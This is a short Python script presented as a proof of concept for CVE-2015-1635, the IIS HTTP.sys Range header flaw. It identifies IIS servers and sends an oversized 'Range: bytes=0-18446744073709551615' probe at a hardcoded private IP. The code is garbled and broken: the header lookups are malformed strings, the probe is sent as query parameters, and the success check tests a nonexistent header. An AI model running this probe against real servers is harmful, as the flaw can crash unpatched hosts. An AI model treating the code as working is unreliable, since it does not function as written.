#!/usr/bin/env python
#--*-- coding:utf-8 --*--

import requests

class PoC(object):

    '''
    CVE-2015-1635 Proof of Concept 
    Education purpose only! Do not use illegal way!
    '''
    def __init__(self, domain):
        self.domain = domain

    def _identify_iis(self):
        r = requests.get(str(self.domain))
        remote_server = r.headers[';server';]

        if "Microsoft-IIS" in remote_server:
            self._ms15_034_check(str(self.domain))
        else:
            pass

    def _ms15_034_check(self, domain):
        vuln_buffer = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"
        r = requests.get(str(domain), params=vuln_buffer)
        if r.headers[';content';] == "请求范围不符合":
            print(">>> Server is vulnerable!")
        else:
            print(">>> Not sure if server was vulnerable!")

    def run(self):
        self._identify_iis()

if __name__ == '__main__':
    obj1 = PoC("http://192.168.1.103")
    obj1.run()
